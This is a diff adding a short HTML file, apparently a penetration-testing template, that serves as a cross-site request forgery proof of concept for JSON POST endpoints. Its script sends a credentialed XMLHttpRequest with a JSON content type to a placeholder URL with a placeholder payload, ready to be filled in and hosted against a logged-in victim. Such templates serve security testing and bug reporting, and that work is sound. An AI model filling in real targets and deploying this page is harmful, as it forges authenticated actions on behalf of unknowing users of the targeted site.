@@ -1,0 +1,15 @@
+<html>
+<title>
+	CSRF JSON POST PoC
+</title>
+<p>
+	JSON Complex POST Based CSRF PoC.
+</p>
+<script>
+	var xhr = new XMLHttpRequest();
+	xhr.open("POST", "<your url here>");
+	xhr.withCredentials = true;
+	xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+	xhr.send('<your payload here>');
+</script>
+</html>
